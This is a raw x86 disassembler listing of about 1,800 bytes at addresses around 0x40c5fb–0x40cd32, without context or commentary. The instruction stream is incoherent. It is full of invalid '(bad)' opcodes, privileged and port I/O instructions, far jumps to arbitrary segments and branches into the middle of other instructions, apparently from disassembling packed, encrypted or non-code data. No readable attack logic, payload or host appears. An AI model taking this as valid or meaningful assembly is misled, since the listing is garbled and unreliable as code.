  40c5fb:	mov    ecx,eax
  40c5fd:	cmc    
  40c5fe:	pop    edx
  40c5ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c600:	dec    BYTE PTR [edi]
  40c602:	int    0xee
  40c604:	lock adc eax,0xe5e8de7e
  40c60a:	call   0x441e6352
  40c60f:	mov    cl,BYTE PTR ds:0x47a1b22e
  40c615:	mov    eax,ds:0xc45543e1
  40c61a:	jne    0x40c5f5
  40c61c:	pop    edi
  40c61d:	es push eax
  40c61f:	call   DWORD PTR [edx-0x1657db41]
  40c625:	inc    esi
  40c626:	aas    
  40c627:	dec    edi
  40c628:	xor    DWORD PTR [edi],0x9
  40c62b:	imul   edi,DWORD PTR [ebx],0x18148f97
  40c631:	stc    
  40c632:	adc    DWORD PTR [edi],ebx
  40c634:	or     DWORD PTR [eax],eax
  40c636:	jae    0x40c5db
  40c638:	outs   dx,DWORD PTR ds:[esi]
  40c639:	nop
  40c63a:	inc    eax
  40c63b:	repnz (bad) 
  40c63d:	push   0x43
  40c63f:	sbb    BYTE PTR [ebp+ecx*2-0x1f32fc0],al
  40c646:	and    eax,0x312caae8
  40c64b:	dec    ebp
  40c64c:	inc    edi
  40c64d:	loopne 0x40c64e
  40c64f:	cdq    
  40c650:	aas    
  40c651:	gs popf 
  40c653:	mov    esi,0x110dce18
  40c658:	call   0xfde1:0x35c3b3a8
  40c65f:	push   ss
  40c660:	inc    ecx
  40c661:	ja     0x40c682
  40c663:	fsub   QWORD PTR [ebp+0x3f]
  40c666:	ss push ecx
  40c668:	js     0x40c5f0
  40c66a:	dec    esi
  40c66b:	jo     0x40c63b
  40c66d:	das    
  40c66e:	lods   eax,DWORD PTR ds:[esi]
  40c66f:	int3   
  40c670:	lods   al,BYTE PTR ds:[esi]
  40c671:	fdivr  DWORD PTR [edx]
  40c673:	out    dx,eax
  40c674:	xchg   ebp,eax
  40c675:	xchg   esi,eax
  40c676:	in     eax,0x83
  40c678:	mov    eax,0x56705902
  40c67d:	test   eax,0x5d413dce
  40c682:	int    0xd6
  40c684:	out    0x70,eax
  40c686:	add    edi,DWORD PTR [esi+0x43]
  40c689:	leave  
  40c68a:	or     al,0x29
  40c68c:	stos   BYTE PTR es:[edi],al
  40c68d:	and    eax,0x6543733f
  40c692:	iret   
  40c693:	adc    DWORD PTR [edi+0x60],ebx
  40c696:	xor    DWORD PTR [esi],edi
  40c698:	mov    dh,bh
  40c69a:	inc    esp
  40c69b:	jmp    0xa8bddb98
  40c6a0:	jae    0x40c71b
  40c6a2:	mov    ds:0x3401124d,eax
  40c6a7:	scas   eax,DWORD PTR es:[edi]
  40c6a8:	cwde   
  40c6a9:	lods   al,BYTE PTR ds:[esi]
  40c6aa:	push   0x675b42bd
  40c6af:	mov    cs,WORD PTR [ebx]
  40c6b1:	sbb    eax,DWORD PTR [edx]
  40c6b3:	call   0x4398:0xd94a275f
  40c6ba:	mov    esi,0xed068d83
  40c6bf:	idiv   BYTE PTR [ebx+0x45b2bee9]
  40c6c5:	addr16 inc esi
  40c6c7:	add    edx,ecx
  40c6c9:	mov    edx,0xfff74814
  40c6ce:	jo     0x40c6f9
  40c6d0:	and    cl,al
  40c6d2:	push   ss
  40c6d3:	or     ch,al
  40c6d5:	aaa    
  40c6d6:	pop    ebp
  40c6d7:	std    
  40c6d8:	repnz (bad) 
  40c6da:	fcom   QWORD PTR [esi+eax*4-0x1c97e373]
  40c6e1:	and    eax,0xbf11399c
  40c6e6:	mov    esp,0x4b913e1d
  40c6eb:	mov    DWORD PTR [esi-0x5c],edx
  40c6ee:	(bad)  ds:0x54c046b9
  40c6f4:	inc    ebp
  40c6f5:	or     al,0x14
  40c6f7:	xchg   edx,eax
  40c6f8:	cmp    dh,0xa
  40c6fb:	arpl   WORD PTR [edi+0x43],cx
  40c6fe:	das    
  40c6ff:	js     0x40c77c
  40c701:	mov    dl,0xf3
  40c703:	jg     0x40c70a
  40c705:	popf   
  40c706:	jbe    0x40c762
  40c708:	xchg   esi,eax
  40c709:	in     eax,dx
  40c70a:	int3   
  40c70b:	mov    bl,0xd8
  40c70d:	jne    0x40c705
  40c70f:	jo     0x40c6b9
  40c711:	cdq    
  40c712:	xchg   edi,eax
  40c713:	pop    esp
  40c714:	adc    ebx,edx
  40c716:	pop    edi
  40c717:	ffreep st(6)
  40c719:	rol    DWORD PTR [ebp+0x5a],0x44
  40c71d:	dec    edi
  40c71e:	sbb    al,0x77
  40c720:	scas   eax,DWORD PTR es:[edi]
  40c721:	mov    fs:0xe8a60f7d,eax
  40c727:	icebp  
  40c728:	add    edi,DWORD PTR [edx]
  40c72a:	mov    eax,0x2e402b11
  40c72f:	int    0x33
  40c731:	add    esp,ebx
  40c733:	sub    DWORD PTR [ecx+0x78e7161d],0x77
  40c73a:	retf   0x4fda
  40c73d:	mov    edx,0xa7ef3fd5
  40c742:	push   ebp
  40c743:	test   BYTE PTR [ebx-0x32],bl
  40c746:	cwde   
  40c747:	inc    ebx
  40c748:	xchg   ecx,eax
  40c749:	enter  0xaa9d,0xb7
  40c74d:	mov    cl,0xf1
  40c74f:	jne    0x40c746
  40c751:	dec    BYTE PTR [ebx]
  40c753:	mov    eax,ds:0x4f6a96bf
  40c758:	mov    ebx,ds
  40c75a:	sar    BYTE PTR [edx+0x157b4c38],0x5b
  40c761:	cmp    eax,0x6eb38fa0
  40c766:	mov    cl,0x47
  40c768:	add    ebx,DWORD PTR [edi+eiz*4+0x530c5ec]
  40c76f:	adc    eax,0xaf8bc9f2
  40c774:	fs inc esi
  40c776:	or     al,0xcd
  40c778:	dec    esp
  40c779:	or     ah,BYTE PTR [esi+esi*4+0x1f]
  40c77d:	or     cl,BYTE PTR [edx]
  40c77f:	shl    ch,1
  40c781:	je     0x40c7fa
  40c783:	push   ebp
  40c784:	add    cl,0x83
  40c787:	and    ecx,0x69a7eb93
  40c78d:	into   
  40c78e:	push   es
  40c78f:	(bad)  
  40c790:	fcomp  st(2)
  40c792:	mov    al,ds:0x78523709
  40c797:	cmp    ebp,ebp
  40c799:	adc    DWORD PTR [edi],edx
  40c79b:	les    ebx,FWORD PTR [ecx]
  40c79d:	cmp    BYTE PTR [edx-0x52],dh
  40c7a0:	xor    al,0x64
  40c7a2:	pop    es
  40c7a3:	repnz pushf 
  40c7a5:	lahf   
  40c7a6:	repnz lahf 
  40c7a8:	popa   
  40c7a9:	xchg   esp,eax
  40c7aa:	into   
  40c7ab:	xor    ah,BYTE PTR [eax-0x1b]
  40c7ae:	mov    eax,ds:0x583d85c1
  40c7b3:	dec    edx
  40c7b4:	push   ss
  40c7b5:	adc    DWORD PTR [edx],edi
  40c7b7:	adc    DWORD PTR [ebx+0x74af0ee5],0x67
  40c7be:	mov    eax,0xeb213267
  40c7c3:	in     al,0x2f
  40c7c5:	xchg   ecx,eax
  40c7c6:	imul   esi,edi,0xc
  40c7c9:	ror    BYTE PTR ds:0xa9a6402a,cl
  40c7cf:	add    DWORD PTR [edx+0x6],edx
  40c7d2:	sub    edi,DWORD PTR [eax-0x5a]
  40c7d5:	fcomp  QWORD PTR [ecx+ebp*1]
  40c7d8:	sbb    al,0xd1
  40c7da:	out    0x33,al
  40c7dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7dd:	leave  
  40c7de:	cmp    edi,DWORD PTR ds:0xd1e8a195
  40c7e4:	cmp    esi,DWORD PTR [ecx]
  40c7e6:	xlat   BYTE PTR ds:[ebx]
  40c7e7:	or     eax,0x3698dd54
  40c7ec:	dec    eax
  40c7ed:	mov    BYTE PTR ds:0x60fe382b,ah
  40c7f3:	std    
  40c7f4:	std    
  40c7f5:	mov    ecx,0x7af55fba
  40c7fa:	ffree  st(5)
  40c7fc:	sbb    DWORD PTR [ebx-0x2b0d3783],eax
  40c802:	xchg   esi,eax
  40c803:	out    0xda,al
  40c805:	sahf   
  40c806:	push   esi
  40c807:	retf   0x5f33
  40c80a:	repnz push esp
  40c80c:	xchg   ebx,eax
  40c80d:	and    BYTE PTR [ebp+0x7a],ah
  40c810:	call   0x2256fad5
  40c815:	scas   eax,DWORD PTR es:[edi]
  40c816:	sub    al,0x4f
  40c818:	pushf  
  40c819:	mov    edx,0xce803eb3
  40c81e:	jo     0x40c7f1
  40c820:	cmp    al,0xd6
  40c822:	stc    
  40c823:	xchg   DWORD PTR [esi-0x9],eax
  40c826:	add    BYTE PTR [ebp+0x73],dh
  40c829:	add    eax,0x74ae1fec
  40c82e:	xchg   edx,eax
  40c82f:	mov    al,ds:0x579669a3
  40c834:	lahf   
  40c835:	jle    0x40c85b
  40c837:	dec    esp
  40c838:	iret   
  40c839:	or     al,0xb5
  40c83b:	mov    al,ds:0x8bb4a216
  40c840:	test   al,0xe4
  40c842:	cdq    
  40c843:	adc    eax,0x1079d321
  40c848:	pusha  
  40c849:	jmp    0xfe6:0x9c420092
  40c850:	shl    BYTE PTR [edx-0x7fc854f4],0x6c
  40c857:	fadd   DWORD PTR fs:[esi]
  40c85a:	stos   DWORD PTR es:[edi],eax
  40c85b:	dec    eax
  40c85c:	(bad)  
  40c85f:	jnp    0x40c8c7
  40c861:	mov    eax,ds:0x8aeb8929
  40c866:	dec    edi
  40c867:	ficom  WORD PTR [edx]
  40c869:	loope  0x40c8da
  40c86b:	dec    esp
  40c86c:	cmp    edi,DWORD PTR [ebx+edx*8]
  40c86f:	jo     0x40c870
  40c871:	fist   WORD PTR [eax-0x7c0b4cfd]
  40c877:	xchg   ecx,eax
  40c878:	add    BYTE PTR [si-0x6f],dl
  40c87c:	je     0x40c87f
  40c87e:	ficomp WORD PTR [esi]
  40c880:	pop    ebp
  40c881:	es push ecx
  40c883:	fcomip st,st(6)
  40c885:	cdq    
  40c886:	mov    al,0xb8
  40c888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c889:	adc    al,0xa4
  40c88b:	outs   dx,DWORD PTR ds:[esi]
  40c88c:	lock add dh,BYTE PTR [ebp+0x418541]
  40c893:	pop    esi
  40c894:	out    0xd2,al
  40c896:	xchg   ebx,eax
  40c897:	mov    dh,0xf9
  40c899:	jb     0x40c8aa
  40c89b:	pop    esp
  40c89c:	(bad)  
  40c89d:	bound  eax,QWORD PTR [edx-0x1f]
  40c8a0:	add    ebx,ecx
  40c8a2:	out    dx,al
  40c8a3:	sahf   
  40c8a4:	mov    al,ds:0x8b51dba
  40c8a9:	test   eax,0xfce5a574
  40c8ae:	push   edx
  40c8af:	jl     0x40c90e
  40c8b1:	out    0xdc,al
  40c8b3:	sahf   
  40c8b4:	movzx  ebp,WORD PTR [edi]
  40c8b7:	(bad)  
  40c8b8:	div    BYTE PTR [edi]
  40c8ba:	ret    
  40c8bb:	push   eax
  40c8bc:	and    bh,BYTE PTR [ebp-0x29]
  40c8bf:	cdq    
  40c8c0:	push   edx
  40c8c1:	leave  
  40c8c2:	and    esp,edx
  40c8c4:	mul    BYTE PTR [edi-0x574ca41d]
  40c8ca:	or     DWORD PTR [edx],edx
  40c8cc:	cwde   
  40c8cd:	xchg   cl,al
  40c8cf:	xor    BYTE PTR [ecx+0xe],0x74
  40c8d3:	inc    edx
  40c8d4:	hlt    
  40c8d5:	xchg   esp,eax
  40c8d6:	ds inc ebp
  40c8d8:	es loope 0x40c93f
  40c8db:	in     al,dx
  40c8dc:	aaa    
  40c8dd:	fdivr  DWORD PTR [ebp-0x8b580ab]
  40c8e3:	sub    BYTE PTR [ebx+ebp*2-0x19b66388],bl
  40c8ea:	push   esi
  40c8eb:	cli    
  40c8ec:	icebp  
  40c8ed:	sbb    eax,0x2af03246
  40c8f2:	iret   
  40c8f3:	mov    ebp,0x864aabc6
  40c8f8:	test   al,0xd1
  40c8fa:	ins    DWORD PTR es:[edi],dx
  40c8fb:	outs   dx,DWORD PTR ds:[esi]
  40c8fc:	sbb    DWORD PTR ds:0xc4877a4f,ebx
  40c902:	clc    
  40c903:	adc    eax,0xc82625c2
  40c908:	pop    edi
  40c909:	mov    esi,0xa15f2f9a
  40c90e:	mov    dh,0xa9
  40c910:	mov    BYTE PTR [edx+0x1b],bh
  40c913:	xor    eax,0xa19aa561
  40c918:	fnsave [ebp-0x30]
  40c91b:	out    dx,al
  40c91c:	jg     0x40c934
  40c91e:	out    dx,al
  40c91f:	in     eax,0xbd
  40c921:	pop    esi
  40c922:	lods   eax,DWORD PTR ds:[esi]
  40c923:	jge    0x40c8a8
  40c925:	mov    WORD PTR [edi],ds
  40c927:	stos   DWORD PTR es:[edi],eax
  40c928:	inc    ecx
  40c929:	fstp   DWORD PTR [edx]
  40c92b:	xchg   edx,eax
  40c92c:	dec    DWORD PTR [edi]
  40c92e:	push   es
  40c92f:	pop    eax
  40c930:	lods   eax,DWORD PTR ds:[esi]
  40c931:	dec    ebx
  40c932:	or     bh,BYTE PTR ds:0x7a9c35ec
  40c938:	stos   DWORD PTR es:[edi],eax
  40c939:	xor    ebx,edi
  40c93b:	cwde   
  40c93c:	iret   
  40c93d:	inc    ebp
  40c93e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c93f:	mov    bh,0x2e
  40c941:	sbb    al,0x6f
  40c943:	add    al,0xee
  40c945:	shl    BYTE PTR [ebx-0x34],cl
  40c948:	adc    ah,BYTE PTR [eax+0x6]
  40c94b:	pushf  
  40c94c:	in     eax,0x94
  40c94e:	test   BYTE PTR [eax-0x392e43e9],bh
  40c954:	test   eax,0x951b139c
  40c959:	sti    
  40c95a:	iret   
  40c95b:	mov    edi,DWORD PTR [ebp+0x78bd9c5f]
  40c961:	mov    ah,0x3a
  40c963:	fwait
  40c964:	cmc    
  40c965:	iret   
  40c966:	fisub  WORD PTR [eax]
  40c968:	sub    al,0xfd
  40c96a:	xor    ch,BYTE PTR [edx+0x22]
  40c96d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c96e:	mov    cl,0xfa
  40c970:	sub    al,0x77
  40c972:	inc    edi
  40c973:	cmp    edi,DWORD PTR [ecx+eiz*8]
  40c976:	or     DWORD PTR [ecx+0x4e6fc620],0xd49cbb89
  40c980:	addr16 aaa 
  40c982:	or     BYTE PTR [edi-0x289524b8],bl
  40c988:	mov    dl,0x8b
  40c98a:	mov    ebp,0xcc80859d
  40c98f:	push   es
  40c990:	xor    al,0xb7
  40c992:	ret    
  40c993:	jnp    0x40ca08
  40c995:	(bad)  
  40c996:	outs   dx,BYTE PTR ds:[esi]
  40c997:	fnstenv [edi+eiz*8+0x2d3493b2]
  40c99e:	push   ebx
  40c99f:	push   ss
  40c9a0:	add    dh,BYTE PTR ds:0xd3f2dfe6
  40c9a6:	imul   edx,DWORD PTR [edx+0x62350115],0x1
  40c9ad:	or     BYTE PTR [edx+0x7787c23b],ah
  40c9b3:	leave  
  40c9b4:	inc    edx
  40c9b5:	cs xchg edi,eax
  40c9b7:	cmp    al,0x9
  40c9ba:	cld    
  40c9bb:	outs   dx,DWORD PTR ss:[esi]
  40c9bd:	xchg   esi,eax
  40c9be:	mov    edx,0xb5c2dfbb
  40c9c3:	pop    ebp
  40c9c4:	iretw  
  40c9c6:	add    eax,0x790a0c42
  40c9cb:	les    ecx,FWORD PTR [esi-0xa]
  40c9ce:	xor    esp,esi
  40c9d0:	jmp    0x6aeb:0x98e6681d
  40c9d7:	and    al,0x5b
  40c9d9:	retf   0x629c
  40c9dc:	fldenv [esi+0x5476e56c]
  40c9e2:	jmp    0xe37b:0x9251253a
  40c9e9:	pop    ds
  40c9ea:	not    BYTE PTR [esi]
  40c9ec:	and    al,0xd6
  40c9ee:	cld    
  40c9ef:	mov    cl,0xe0
  40c9f1:	jecxz  0x40c97e
  40c9f3:	or     al,0x63
  40c9f5:	enter  0xeb57,0xfe
  40c9f9:	sub    cl,BYTE PTR [eax-0x31]
  40c9fc:	pop    esi
  40c9fd:	mov    ch,0x93
  40c9ff:	rol    DWORD PTR [edx],0xf5
  40ca02:	test   BYTE PTR [ecx],0x9c
  40ca05:	test   dl,dl
  40ca07:	push   es
  40ca08:	lahf   
  40ca09:	jb     0x40ca4c
  40ca0b:	inc    ebx
  40ca0c:	loop   0x40ca22
  40ca0e:	mov    eax,0xcf770c6c
  40ca13:	mov    ds:0x21fc504d,al
  40ca18:	mov    bx,0xb834
  40ca1c:	push   edx
  40ca1d:	jmp    0x3638a95f
  40ca22:	aad    0xc1
  40ca24:	ins    BYTE PTR es:[edi],dx
  40ca25:	push   cs
  40ca26:	cdq    
  40ca27:	adc    DWORD PTR [edi+eiz*8],ebp
  40ca2a:	push   eax
  40ca2b:	mov    cl,0x6e
  40ca2d:	xor    al,0x48
  40ca2f:	add    BYTE PTR [esi],ch
  40ca31:	push   0x38
  40ca33:	jae    0x40c9d4
  40ca35:	in     al,0xc6
  40ca37:	cmc    
  40ca38:	loop   0x40c9d4
  40ca3a:	and    BYTE PTR [ebx-0x36],dl
  40ca3d:	inc    ebp
  40ca3e:	push   ecx
  40ca3f:	test   DWORD PTR [ebx+0x23e1c20],ebp
  40ca45:	or     bh,BYTE PTR [edi-0x12]
  40ca48:	pushf  
  40ca49:	push   ss
  40ca4a:	loop   0x40c9fa
  40ca4c:	sub    ch,ah
  40ca4e:	push   edi
  40ca4f:	aaa    
  40ca50:	push   cs
  40ca51:	jns    0x40ca8a
  40ca53:	jl     0x40ca89
  40ca55:	sahf   
  40ca56:	int3   
  40ca57:	stos   BYTE PTR es:[edi],al
  40ca58:	std    
  40ca59:	ja     0x40c9f6
  40ca5b:	add    DWORD PTR ss:[ecx+0x4b],0x9cdb8c84
  40ca63:	lea    eax,[esi]
  40ca65:	sub    edx,DWORD PTR [eax-0x37]
  40ca68:	inc    edi
  40ca69:	cmp    DWORD PTR [eax],ecx
  40ca6b:	pop    es
  40ca6c:	push   cs
  40ca6d:	fcomi  st,st(1)
  40ca6f:	push   esi
  40ca70:	jecxz  0x40cad5
  40ca72:	mov    cl,0xdc
  40ca74:	push   esi
  40ca75:	pushf  
  40ca76:	push   ecx
  40ca77:	aad    0x97
  40ca79:	add    DWORD PTR [edx],ebx
  40ca7b:	cs jl  0x40ca7f
  40ca7e:	dec    ecx
  40ca7f:	inc    edi
  40ca80:	push   ds
  40ca81:	ja     0x40caf1
  40ca83:	(bad)  
  40ca84:	and    esp,DWORD PTR [ebx+0x2f]
  40ca87:	inc    esi
  40ca88:	mov    ebp,0x62e756fc
  40ca8d:	push   ss
  40ca8e:	sbb    ch,BYTE PTR [eax+0x73]
  40ca91:	cli    
  40ca92:	je     0x40ca3e
  40ca94:	add    ecx,esi
  40ca96:	pop    ebx
  40ca97:	or     ebp,DWORD PTR [ebx]
  40ca99:	sbb    BYTE PTR ds:0xabdaa77e,0xc0
  40caa0:	mov    al,0xbd
  40caa2:	push   0xffffff99
  40caa4:	mov    ecx,0x73dcdb35
  40caa9:	push   ebp
  40caaa:	out    0x26,eax
  40caac:	mov    BYTE PTR [esi+0x37],cl
  40caaf:	or     ebp,ecx
  40cab1:	sbb    eax,esi
  40cab3:	xor    BYTE PTR [edx-0x1d51425e],0xae
  40caba:	aas    
  40cabb:	mov    ebx,0x111c2e51
  40cac0:	push   ecx
  40cac1:	mov    ebx,0xd4f489bd
  40cac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cac7:	(bad)  
  40cac8:	int    0x1b
  40caca:	dec    esi
  40cacb:	out    0x83,al
  40cacd:	sub    ebx,DWORD PTR [ecx]
  40cacf:	ja     0x40ca68
  40cad1:	ror    BYTE PTR [ebp-0x5486db1a],cl
  40cad7:	mov    ds:0xcdc57e70,eax
  40cadc:	or     bl,BYTE PTR [eax+0xb]
  40cadf:	jne    0x40cafb
  40cae1:	stos   BYTE PTR es:[edi],al
  40cae2:	pop    eax
  40cae3:	mov    al,0xb4
  40cae5:	xchg   edi,eax
  40cae6:	enter  0x7295,0x27
  40caea:	pop    DWORD PTR [edi-0x7f]
  40caed:	sub    edx,DWORD PTR ds:0x6278ca95
  40caf3:	sbb    DWORD PTR [edx-0x1c],ecx
  40caf6:	pop    ebx
  40caf7:	or     al,BYTE PTR [ebp-0x698ec57d]
  40cafd:	pop    ecx
  40cafe:	aaa    
  40caff:	sub    al,0xe5
  40cb01:	and    BYTE PTR [eax+0x40],bl
  40cb04:	(bad)  
  40cb05:	mov    edi,0xb4fd5782
  40cb0a:	pusha  
  40cb0b:	pop    edi
  40cb0c:	iret   
  40cb0d:	fidiv  DWORD PTR ds:0xc32017fb
  40cb13:	pop    ss
  40cb14:	or     DWORD PTR [eax-0x5],edi
  40cb17:	add    ecx,edi
  40cb19:	push   cs
  40cb1a:	xor    DWORD PTR [edi],ebp
  40cb1c:	std    
  40cb1d:	add    bl,BYTE PTR [esi+0x70]
  40cb20:	jo     0x40cab6
  40cb22:	mov    dh,0x4f
  40cb24:	in     al,0xd6
  40cb26:	pop    eax
  40cb27:	(bad)  
  40cb28:	jmp    0x40cb7c
  40cb2a:	fimul  WORD PTR [edx+0x100171ca]
  40cb30:	inc    ecx
  40cb31:	lods   al,BYTE PTR ds:[esi]
  40cb32:	pop    ecx
  40cb33:	test   DWORD PTR [ebp+0x14421909],0x2ad75b08
  40cb3d:	xchg   esi,eax
  40cb3e:	mov    ah,BYTE PTR [ebp-0x7e]
  40cb41:	scas   al,BYTE PTR es:[edi]
  40cb42:	fist   DWORD PTR [edx-0x9]
  40cb45:	fisubr WORD PTR [ecx-0x6b]
  40cb48:	push   ebx
  40cb49:	jecxz  0x40cb82
  40cb4b:	add    ecx,edi
  40cb4d:	jns    0x40caf6
  40cb4f:	xchg   edi,eax
  40cb50:	mov    bl,0x64
  40cb52:	div    BYTE PTR ss:[esi]
  40cb55:	jmp    0x40caf5
  40cb57:	shl    DWORD PTR [esi-0x39],1
  40cb5a:	aam    0x44
  40cb5c:	(bad)  
  40cb5d:	lods   eax,DWORD PTR ds:[esi]
  40cb5e:	(bad)  
  40cb5f:	dec    BYTE PTR [ecx-0x1c64fdf]
  40cb65:	aad    0xb0
  40cb67:	mov    ch,0x7c
  40cb69:	adc    al,0x29
  40cb6b:	or     edx,esp
  40cb6d:	scas   al,BYTE PTR es:[edi]
  40cb6e:	call   0xf0fa1113
  40cb73:	cmp    eax,0xb4c5109d
  40cb78:	add    ebp,DWORD PTR [ecx-0xb]
  40cb7b:	imul   ebp,DWORD PTR [eax-0x45],0xffffffd0
  40cb7f:	dec    eax
  40cb80:	add    eax,0x4fa9f5ae
  40cb85:	push   ds
  40cb86:	xchg   esp,eax
  40cb87:	push   ecx
  40cb88:	and    al,0xb0
  40cb8a:	add    ecx,DWORD PTR [esi+0x4a05202d]
  40cb90:	icebp  
  40cb91:	(bad)  
  40cb92:	xor    BYTE PTR ds:0x171447d1,ch
  40cb98:	iret   
  40cb99:	xor    edx,DWORD PTR [edi+0x13c87171]
  40cb9f:	sti    
  40cba0:	sar    DWORD PTR [ebp-0x46],cl
  40cba3:	mov    dl,0xdc
  40cba5:	xchg   edx,eax
  40cba6:	cmp    BYTE PTR [ebx],0xaf
  40cba9:	dec    edi
  40cbaa:	jnp    0x40cbf2
  40cbac:	pop    eax
  40cbad:	xor    dl,BYTE PTR [esi-0x229fffc2]
  40cbb3:	jle    0x40cb57
  40cbb5:	mov    cl,0x5e
  40cbb7:	(bad)  
  40cbb9:	es xchg edi,ebx
  40cbbc:	outs   dx,BYTE PTR ds:[esi]
  40cbbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbbe:	add    al,0x5e
  40cbc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbc1:	sub    edx,DWORD PTR [eax-0x4c0220ad]
  40cbc7:	fisub  WORD PTR [ebx]
  40cbc9:	sbb    DWORD PTR [edi+0x51828df8],0x2fbfc15f
  40cbd3:	add    al,0xe2
  40cbd5:	mov    edx,0xf41f5d73
  40cbda:	ins    BYTE PTR es:[edi],dx
  40cbdb:	mov    ecx,DWORD PTR [edi-0x3a]
  40cbde:	shl    DWORD PTR [ebx+ebx*8+0x20],0x28
  40cbe3:	lods   al,BYTE PTR ds:[esi]
  40cbe4:	daa    
  40cbe5:	or     eax,0xb25b0121
  40cbea:	icebp  
  40cbeb:	xchg   edx,eax
  40cbec:	or     edx,DWORD PTR [esi-0x3f]
  40cbef:	out    0xeb,eax
  40cbf1:	aad    0xd0
  40cbf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbf4:	addr16 ds mov cl,0xe2
  40cbf8:	xchg   edi,eax
  40cbf9:	aam    0x87
  40cbfb:	fwait
  40cbfc:	(bad)  
  40cbfd:	fnstcw WORD PTR [edx]
  40cbff:	loop   0x40cbb8
  40cc01:	add    DWORD PTR [esi-0x66ad2213],0xffffffe6
  40cc08:	(bad)  
  40cc09:	dec    DWORD PTR [eax+0x3b03f415]
  40cc0f:	cld    
  40cc10:	xor    al,0x71
  40cc12:	adc    al,0xb2
  40cc14:	xor    al,0xa7
  40cc16:	or     dh,bl
  40cc18:	mov    bl,BYTE PTR [esi]
  40cc1a:	xchg   ebp,eax
  40cc1b:	adc    eax,0xf9fadf71
  40cc20:	xchg   ebx,eax
  40cc21:	out    0x52,eax
  40cc23:	or     bl,0xfd
  40cc26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc27:	gs jns 0x40cca9
  40cc2a:	pop    ds
  40cc2b:	xchg   ecx,eax
  40cc2c:	inc    edi
  40cc2d:	sahf   
  40cc2e:	dec    esi
  40cc2f:	mov    dh,0x55
  40cc31:	div    BYTE PTR [ebp-0x64]
  40cc34:	sbb    edx,eax
  40cc36:	adc    BYTE PTR [edx],ch
  40cc38:	inc    eax
  40cc39:	inc    ebx
  40cc3a:	fisttp WORD PTR [ecx+0x6123c17b]
  40cc40:	call   0xa776:0xcea90afc
  40cc47:	jge    0x40cc1a
  40cc49:	xor    DWORD PTR [edi-0x4617f4ed],edx
  40cc4f:	pusha  
  40cc50:	mov    ah,0x2c
  40cc52:	es add esp,edx
  40cc55:	inc    ecx
  40cc56:	or     al,0xe9
  40cc58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc59:	out    0xbc,eax
  40cc5b:	cwde   
  40cc5c:	out    0x5f,al
  40cc5e:	mov    ah,0xd1
  40cc60:	mov    cl,0x8f
  40cc62:	(bad)  
  40cc63:	fimul  WORD PTR [edx]
  40cc65:	push   DWORD PTR [eax]
  40cc67:	leave  
  40cc68:	hlt    
  40cc69:	pop    ebx
  40cc6a:	jg     0x40cc22
  40cc6c:	dec    edi
  40cc6d:	jno    0x40cc61
  40cc6f:	push   0x10
  40cc71:	add    eax,0xdb82d4d1
  40cc76:	(bad)  
  40cc77:	mov    edx,0x3c4f43ac
  40cc7c:	push   ss
  40cc7d:	sbb    al,0xb4
  40cc7f:	mov    WORD PTR [edx+0x32d5445c],?
  40cc85:	(bad)  
  40cc86:	cli    
  40cc87:	and    esi,DWORD PTR [ecx+eiz*8+0x40d1146d]
  40cc8e:	push   ss
  40cc8f:	ins    BYTE PTR es:[edi],dx
  40cc90:	mov    bl,BYTE PTR [esi+ebp*4]
  40cc93:	xchg   ebp,eax
  40cc94:	es inc ebp
  40cc96:	je     0x40cc9f
  40cc98:	push   cs
  40cc99:	ficom  WORD PTR ds:0x56f09fa0
  40cc9f:	hlt    
  40cca0:	sbb    edi,ebp
  40cca2:	dec    ecx
  40cca3:	je     0x40cc70
  40cca5:	adc    cl,BYTE PTR [edx]
  40cca7:	add    al,0x9
  40cca9:	sti    
  40ccaa:	sti    
  40ccab:	and    cl,dl
  40ccad:	aad    0x91
  40ccaf:	sbb    al,BYTE PTR [ecx-0x5f1ebe25]
  40ccb5:	setbe  BYTE PTR [edi+0x24]
  40ccb9:	int    0xd4
  40ccbb:	loopne 0x40cc7f
  40ccbd:	adc    al,0xb7
  40ccbf:	cmp    ebx,DWORD PTR [edx-0x47]
  40ccc2:	shl    DWORD PTR [ecx-0x5bc4ab2f],0xa2
  40ccc9:	and    al,0x21
  40cccb:	adc    al,0xc0
  40cccd:	mov    BYTE PTR [ebx-0x77f19070],ah
  40ccd3:	dec    ebp
  40ccd4:	sbb    DWORD PTR [edi],esi
  40ccd6:	push   ds
  40ccd7:	adc    DWORD PTR [ebp+eax*1+0x21b7ad21],esi
  40ccde:	std    
  40ccdf:	ins    BYTE PTR es:[edi],dx
  40cce0:	pop    esi
  40cce1:	jmp    0x5342f7dc
  40cce6:	je     0x40ccb9
  40cce8:	push   edx
  40cce9:	dec    eax
  40ccea:	in     al,0x5b
  40ccec:	nop
  40cced:	or     edx,DWORD PTR [ebx]
  40ccef:	and    BYTE PTR [ebx],bl
  40ccf1:	fadd   st,st(6)
  40ccf3:	out    0x1b,al
  40ccf5:	into   
  40ccf6:	cmc    
  40ccf7:	fwait
  40ccf8:	mov    dl,0x37
  40ccfa:	fnstsw WORD PTR [eax-0x16efa86d]
  40cd00:	test   eax,0x7c563096
  40cd05:	fmul   DWORD PTR [ecx+eiz*2]
  40cd08:	mov    esp,0x47e3877f
  40cd0d:	into   
  40cd0e:	das    
  40cd0f:	mov    dl,0xa
  40cd11:	inc    ebx
  40cd12:	in     al,0xbd
  40cd14:	cmp    ecx,DWORD PTR [ebp-0x9]
  40cd17:	iret   
  40cd18:	outs   dx,DWORD PTR ds:[esi]
  40cd19:	icebp  
  40cd1a:	jle    0x40cd3b
  40cd1c:	bound  edx,QWORD PTR ds:0xc30be163
  40cd22:	cli    
  40cd23:	push   esi
  40cd24:	mov    ch,bl
  40cd26:	ret    0x73cb
  40cd29:	ins    BYTE PTR es:[edi],dx
  40cd2a:	xlat   BYTE PTR ds:[ebx]
  40cd2b:	das    
  40cd2c:	scas   al,BYTE PTR es:[edi]
  40cd2d:	push   0xa4a5a451
  40cd32:	out    dx,eax
